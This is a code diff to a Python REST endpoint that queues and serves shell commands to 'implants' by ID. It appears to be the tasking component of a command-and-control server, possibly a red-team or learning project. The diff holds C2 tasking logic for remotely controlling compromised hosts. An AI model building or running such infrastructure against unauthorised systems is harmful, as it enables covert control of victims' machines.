@@ -5,9 +5,14 @@ from database.dbconnection import get_db_connection
 class Tasks(Resource):
     def get(self):
         try:
+            implant_id = request.args.get('implant_id')
+            
+            if not implant_id:
+                return {"Error": "no implant_id"}
+            
             conn = get_db_connection()
             cursor = conn.cursor()
-            cursor.execute("SELECT task_id,command FROM tasks WHERE executed IS NOT 1")
+            cursor.execute("SELECT task_id, command FROM tasks WHERE executed != 1 AND implants_implant_id = ?", (implant_id,))
             rows = cursor.fetchall()
 
             # Convert the rows to a CSV string
@@ -18,11 +23,12 @@ class Tasks(Resource):
                     csv_string += ',,'.join(map(str, row))
 
             conn.close()
-
+            print(csv_string)
 
             # Return the CSV data and set the appropriate headers
             return csv_string, 200
         except Exception as e:
+            print(str(e))
             return {"Error": str(e)}, 500
     def post(self):
         try:
@@ -34,7 +40,7 @@ class Tasks(Resource):
             print(data[1])
             conn = get_db_connection()
             cursor = conn.cursor()
-            cursor.execute("INSERT INTO tasks (task_id, command) VALUES (?, ?)", (implant_id, command))
+            cursor.execute("INSERT INTO tasks (implants_implant_id, command, executed) VALUES (?, ?, 0)", (implant_id, command))
             conn.commit()
             conn.close()
             return "Task added successfully!", 201
